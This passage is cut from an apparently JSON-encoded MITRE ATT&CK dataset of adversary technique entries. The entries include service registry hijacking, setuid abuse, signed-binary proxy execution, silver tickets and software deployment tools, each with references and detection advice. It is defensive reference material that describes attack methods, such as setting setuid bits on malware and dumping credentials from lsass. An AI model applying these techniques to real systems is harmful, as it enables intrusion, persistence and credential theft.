command-line parameters\",\"Services\",\"File monitoring\"],\"x_mitre_detection\":\"Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\\n\\nLook for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques. \",\"x_mitre_effective_permissions\":[\"SYSTEM\",\"Administrator\",\"User\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-13T11:42:14.444Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for registry to redirect from the originally specified executable to one that they control, in order to launch their own code at Service start.  Windows stores local service configuration information in the Registry under <code>HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services</code>. The information stored under a service\'s Registry keys can be manipulated to modify a service\'s execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: Registry Key Security)\\n\\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\\n\\nAdversaries may also alter Registry keys associated with service failure parameters (such as <code>FailureCommand</code>) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness) \",\"external_references\":[{\"external_id\":\"T1574.011\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1574/011\"},{\"external_id\":\"CAPEC-CAPEC\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/CAPEC.html\"},{\"description\":\"Microsoft. (2018, May 31). Registry Key Security and Access Rights. Retrieved March 16, 2017.\",\"source_name\":\"Registry Key Security\",\"url\":\"https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights?redirectedfrom=MSDN\"},{\"description\":\"Hull, D.. (2014, May 3). Kansa: Service related collectors and analysis. Retrieved October 10, 2019.\",\"source_name\":\"Kansa Service related collectors\",\"url\":\"https://trustedsignal.blogspot.com/2014/05/kansa-service-related-collectors-and.html\"},{\"description\":\"@r0wdy_. (2017, November 30). Service Recovery Parameters. Retrieved April 9, 2018.\",\"source_name\":\"Tweet Registry Perms Weakness\",\"url\":\"https://twitter.com/r0wdy_/status/936365549553991680\"},{\"description\":\"Mark Russinovich. (2019, June 28). Autoruns for Windows v13.96. Retrieved March 13, 2020.\",\"source_name\":\"Autoruns for Windows\",\"url\":\"https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns\"}],\"id\":\"attack-pattern--17cc750b-e95b-4d7d-9dde-49e0de24148c\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T22:01:09.906Z\",\"name\":\"Services Registry Permissions Weakness\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Travis Smith, Tripwire\",\"Matthew Demaske, Adaptforward\"],\"x_mitre_data_sources\":[\"Windows Registry\",\"Services\",\"Process command-line parameters\"],\"x_mitre_defense_bypassed\":[\"Application control\"],\"x_mitre_detection\":\"Service changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\\n\\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. (Citation: Autoruns for Windows) Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\\n\\nMonitor processes and command-line arguments for actions that could be done to modify services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be changed through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional logging may need to be configured to gather the appropriate data.\",\"x_mitre_effective_permissions\":[\"SYSTEM\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1166\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1166\"},{\"description\":\"Michael Kerrisk. (2017, September 15). Linux Programmer\'s Manual. Retrieved September 21, 2018.\",\"source_name\":\"setuid man page\",\"url\":\"http://man7.org/linux/man-pages/man2/setuid.2.html\"},{\"description\":\"Marc-Etienne M.Leveille. (2016, July 6). New OSX/Keydnap malware is hungry for credentials. Retrieved July 3, 2017.\",\"source_name\":\"OSX Keydnap malware\",\"url\":\"https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/\"}],\"id\":\"attack-pattern--c0df6533-30ee-4a4a-9c6d-17af5abdf0b2\",\"modified\":\"2020-02-05T20:09:22.650Z\",\"name\":\"Setuid and Setgid\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-30T14:11:41.212Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary may perform shell escapes or exploit vulnerabilities in an application with the setsuid or setgid bits to get code running in a different user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application, the application will run with the privileges of the owning user or group respectively. (Citation: setuid man page). Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn’t need the elevated privileges.\\n\\nInstead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an \\\"s\\\" instead of an \\\"x\\\" when viewing a file\'s attributes via <code>ls -l</code>. The <code>chmod</code> program can set these bits with via bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>.\\n\\nAdversaries can use this mechanism on their own malware to make sure they\'re able to execute in elevated contexts in the future.(Citation: OSX Keydnap malware).\",\"external_references\":[{\"external_id\":\"T1548.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1548/001\"},{\"description\":\"Michael Kerrisk. (2017, September 15). Linux Programmer\'s Manual. Retrieved September 21, 2018.\",\"source_name\":\"setuid man page\",\"url\":\"http://man7.org/linux/man-pages/man2/setuid.2.html\"},{\"description\":\"Marc-Etienne M.Leveille. (2016, July 6). New OSX/Keydnap malware is hungry for credentials. Retrieved July 3, 2017.\",\"source_name\":\"OSX Keydnap malware\",\"url\":\"https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/\"}],\"id\":\"attack-pattern--6831414d-bb70-42b7-8030-d4e06b2660c9\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-27T00:43:58.149Z\",\"name\":\"Setuid and Setgid\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"Monitor the file system for files that have the setuid or setgid bits set. Monitor for execution of utilities, like chmod, and their command-line arguments to look for setuid or setguid bits being set.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:40.542Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse shared modules to execute malicious payloads. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows [Native API](https://attack.mitre.org/techniques/T1106) which is called from functions like <code>CreateProcess</code>, <code>LoadLibrary</code>, etc. of the Win32 API. (Citation: Wikipedia Windows Library Files)\\n\\nThe module loader can load DLLs:\\n\\n* via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;\\n    \\n* via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);\\n    \\n* via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;\\n    \\n* via <code>&#x3c;file name=\\\"filename.extension\\\" loadFrom=\\\"fully-qualified or relative pathname\\\"&#x3e;</code> in an embedded or external \\\"application manifest\\\". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.\\n\\nAdversaries may use this functionality as a way to execute arbitrary code on a victim system. For example, malware may execute share modules to load additional components or features.\",\"external_references\":[{\"external_id\":\"T1129\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1129\"},{\"description\":\"Wikipedia. (2017, January 31). Microsoft Windows library files. Retrieved February 13, 2017.\",\"source_name\":\"Wikipedia Windows Library Files\",\"url\":\"https://en.wikipedia.org/wiki/Microsoft_Windows_library_files\"}],\"id\":\"attack-pattern--0a5231ec-41af-4a35-83d0-6bdf11f28c65\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"}],\"modified\":\"2020-03-28T18:14:36.980Z\",\"name\":\"Shared Modules\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Stefan Kanthak\"],\"x_mitre_data_sources\":[\"API monitoring\",\"DLL monitoring\",\"File monitoring\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitoring DLL module loads may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances, since benign use of Windows modules load functions are common and may be difficult to distinguish from malicious behavior. Legitimate software will likely only need to load routine, bundled DLL modules or Windows system DLLs such that deviation from known module loads may be suspicious. Limiting DLL module loads to <code>%SystemRoot%</code> and <code>%ProgramFiles%</code> directories will protect against module loads from unsafe paths. \\n\\nCorrelation of other events with behavior surrounding module loads using API monitoring and suspicious DLLs written to disk will provide additional context to an event that may assist in determining if it is due to malicious behavior.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"2.0\"}",
    "{\"created\":\"2017-05-31T21:30:46.047Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"**This technique has been deprecated and should no longer be used.**\\n\\nAdversaries may add malicious content to an internally accessible website through an open network file share that contains the website\'s webroot or Web content directory (Citation: Microsoft Web Root OCT 2016) (Citation: Apache Server 2018) and then browse to that content with a Web browser to cause the server to execute the malicious content. The malicious content will typically run under the context and permissions of the Web server process, often resulting in local system or administrative privileges, depending on how the Web server is configured.\\n\\nThis mechanism of shared access and remote execution could be used for lateral movement to the system running the Web server. For example, a Web server running PHP with an open network share could allow an adversary to upload a remote access tool and PHP script to execute the RAT on the system running the Web server when a specific page is visited. (Citation: Webroot PHP 2011)\",\"external_references\":[{\"external_id\":\"T1051\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1051\"},{\"external_id\":\"CAPEC-563\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/563.html\"},{\"description\":\"Microsoft. (2016, October 20). How to: Find the Web Application Root. Retrieved July 27, 2018.\",\"source_name\":\"Microsoft Web Root OCT 2016\"},{\"description\":\"Apache. (n.d.). Apache HTTP Server Version 2.4 Documentation - Web Site Content. Retrieved July 27, 2018.\",\"source_name\":\"Apache Server 2018\",\"url\":\"http://httpd.apache.org/docs/2.4/getting-started.html#content\"},{\"description\":\"Brandt, Andrew. (2011, February 22). Malicious PHP Scripts on the Rise. Retrieved October 3, 2018.\",\"source_name\":\"Webroot PHP 2011\",\"url\":\"https://www.webroot.com/blog/2011/02/22/malicious-php-scripts-on-the-rise/\"}],\"id\":\"attack-pattern--804c042c-cfe6-449e-bc1a-ba0a998a70db\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"lateral-movement\"}],\"modified\":\"2020-03-30T13:56:55.356Z\",\"name\":\"Shared Webroot\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\"],\"x_mitre_deprecated\":true,\"x_mitre_detection\":\"Use file and process monitoring to detect when files are written to a Web server by a process that is not the normal Web server process or when files are written outside of normal administrative time periods. Use process monitoring to identify normal processes that run on the Web server and detect processes that are not typically executed.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_system_requirements\":[\"Shared webroot directory on remote system\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-14T13:35:32.938Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:\\n\\n* Policies, procedures, and standards\\n* Physical / logical network diagrams\\n* System architecture diagrams\\n* Technical system documentation\\n* Testing / development credentials\\n* Work / project schedules\\n* Source code snippets\\n* Links to network shares and other internal resources\\n\",\"external_references\":[{\"external_id\":\"T1213.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1213/002\"},{\"description\":\"Microsoft. (2017, July 19). Configure audit settings for a site collection. Retrieved April 4, 2018.\",\"source_name\":\"Microsoft SharePoint Logging\",\"url\":\"https://support.office.com/en-us/article/configure-audit-settings-for-a-site-collection-a9920c97-38c0-44f2-8bcb-4cf1e2ae22d2\"}],\"id\":\"attack-pattern--0c4b4fda-9062-47da-98b9-ceae2dcf052a\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"}],\"modified\":\"2020-03-24T16:41:00.821Z\",\"name\":\"Sharepoint\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Office 365 audit logs\",\"Authentication logs\",\"Application logs\"],\"x_mitre_detection\":\"The user access logging within Microsoft\'s SharePoint can be configured to report access to certain pages and documents. (Citation: Microsoft SharePoint Logging). As information repositories generally have a considerably large user base, detection of malicious use can be non-trivial. At minimum, access to information repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) should be closely monitored and alerted upon, as these types of accounts should not generally used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies. \\n\\n\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\",\"Office 365\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:30.757Z\",\"external_references\":[{\"external_id\":\"T1023\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1023\"},{\"external_id\":\"CAPEC-132\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/132.html\"}],\"id\":\"attack-pattern--970cdb5c-02fb-4c38-b17e-d6327cf3c810\",\"modified\":\"2020-01-24T19:36:41.805Z\",\"name\":\"Shortcut Modification\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-24T19:00:32.917Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may create or edit shortcuts to run a program during system boot or user login. Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\\n\\nAdversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.\",\"external_references\":[{\"external_id\":\"T1547.009\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1547/009\"},{\"external_id\":\"CAPEC-132\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/132.html\"}],\"id\":\"attack-pattern--4ab929c6-ee2d-4fb5-aab4-b14be2ed7179\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-25T17:21:27.487Z\",\"name\":\"Shortcut Modification\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Travis Smith, Tripwire\"],\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"Since a shortcut\'s target path likely will not change, modifications to shortcut files that do not correlate with known software changes, patches, removal, etc., may be suspicious. Analysis should attempt to relate shortcut file change or creation events to other potentially suspicious events based on known adversary behavior such as process launches of unknown executables that make network connections.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.\",\"external_references\":[{\"external_id\":\"T1218\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1218\"}],\"id\":\"attack-pattern--457c7820-d331-465a-915e-42f85500ccc4\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T22:39:02.045Z\",\"name\":\"Signed Binary Proxy Execution\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Nishan Maharjan, @loki248\",\"Hans Christoffer Gaardløs\",\"Praetorian\"],\"x_mitre_data_sources\":[\"API monitoring\",\"File monitoring\",\"Binary file metadata\",\"Process use of network\",\"Windows Registry\",\"Loaded DLLs\",\"DLL monitoring\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_defense_bypassed\":[\"Anti-virus\",\"Application control\",\"Digital Certificate Validation\"],\"x_mitre_detection\":\"Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\\n\\nMonitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"2.1\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use scripts signed with trusted certificates to proxy execution of malicious files. Several Microsoft signed scripts that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.(Citation: GitHub Ultimate AppLocker Bypass List)\",\"external_references\":[{\"external_id\":\"T1216\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1216\"},{\"description\":\"Moe, O. (2018, March 1). Ultimate AppLocker Bypass List. Retrieved April 10, 2018.\",\"source_name\":\"GitHub Ultimate AppLocker Bypass List\",\"url\":\"https://github.com/api0cradle/UltimateAppLockerByPassList\"}],\"id\":\"attack-pattern--f6fe9070-7a65-49ea-ae72-76292f42cebe\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T22:39:47.559Z\",\"name\":\"Signed Script Proxy Execution\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Praetorian\"],\"x_mitre_data_sources\":[\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_defense_bypassed\":[\"Application control\",\"Digital Certificate Validation\"],\"x_mitre_detection\":\"Monitor script processes, such as `cscript`, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2020-02-11T19:14:48.309Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.(Citation: ADSecurity Silver Tickets)\\n\\nSilver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.(Citation: ADSecurity Detecting Forged Tickets)\\n\\nPassword hashes for target services may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).\",\"external_references\":[{\"external_id\":\"T1558.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1558/002\"},{\"description\":\"Sean Metcalf. (2015, November 17). How Attackers Use Kerberos Silver Tickets to Exploit Systems. Retrieved February 27, 2020.\",\"source_name\":\"ADSecurity Silver Tickets\",\"url\":\"https://adsecurity.org/?p=2011\"},{\"description\":\"Metcalf, S. (2015, May 03). Detecting Forged Kerberos Ticket (Golden Ticket & Silver Ticket) Use in Active Directory. Retrieved December 23, 2015.\",\"source_name\":\"ADSecurity Detecting Forged Tickets\",\"url\":\"https://adsecurity.org/?p=1515\"},{\"description\":\"French, D. (2018, October 2). Detecting Attempts to Steal Passwords from Memory. Retrieved October 11, 2019.\",\"source_name\":\"Medium Detecting Attempts to Steal Passwords from Memory\",\"url\":\"https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea\"}],\"id\":\"attack-pattern--d273434a-448e-4598-8e14-607f4a0d5e27\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-25T21:46:46.831Z\",\"name\":\"Silver Ticket\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Authentication logs\",\"Windows event logs\"],\"x_mitre_detection\":\"Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4634, 4672).(Citation: ADSecurity Detecting Forged Tickets) \\n\\nMonitor for unexpected processes interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details, including Kerberos tickets, are stored.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:57.201Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may gain access to and use third-party software suites installed within an enterprise network, such as administration, monitoring, and deployment systems, to move laterally through the network. Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, VNC, HBSS, Altiris, etc.).\\n\\nAccess to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\\n\\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform it\'s intended purpose.\",\"external_references\":[{\"external_id\":\"T1072\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1072\"}],\"id\":\"attack-pattern--92a78814-b191-47ca-909c-1ccfe3777414\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"lateral-movement\"}],\"modified\":\"2020-02-21T16:31:32.789Z\",\"name\":\"Software Deployment Tools\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Shane Tully, @securitygypsy\"],\"x_mitre_data_sources\":[\"Authentication logs\",\"File monitoring\",\"Third-party application logs\",\"Windows Registry\",\"Process monitoring\",\"Process use of network\",\"Binary file metadata\"],\"x_mitre_detection\":\"Detection methods will vary depending on the type of third-party software or system and how it is typically used. \\n\\nThe same investigation process can be applied here as with other potentially malicious activities where the distribution vector is initially unknown but the resulting activity follows a discernible pattern. Analyze the process execution trees, historical activities from the third-party application (such as what types of files are usually pushed), and the resulting activities or events from the file/binary/script pushed to systems. \\n\\nOften these third-party applications will have logs of their own that can be collected and correlated with other data from the environment. Ensure that third-party application logs are on-boarded to the enterprise logging system and the logs are regularly reviewed. Audit software deployment logs and look for suspicious or unauthorized activity. A system not typically used to push software to clients that suddenly is used for such a task outside of a known admin function may be suspicious. Monitor account login activity on these applications to detect suspicious/abnormal usage.\\n\\nPerform application deployment at regular times so that irregular deployment activity stands out. Monitor process activity that does not correlate to known good software. Monitor account login activity on the deployment system.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_remote_support\":true,\"x_mitre_version\":\"2.0\"}",
    "{\"created\":\"2019-09-16T17:52:44.147Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1518) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\\n\\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).\",\"external_references\":[{\"external_id\":\"T1518\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1518\"}],\"id\":\"attack-pattern--e3b6daca-e963-4a69-aee6-ed4fd653ad58\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-06-29T19:34:39.136Z\",\"name\":\"Software Discovery\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Stackdriver logs\",\"Azure activity logs\",\"AWS CloudTrail logs\",\"Process command-line parameters\",\"Process monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\\n\\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and 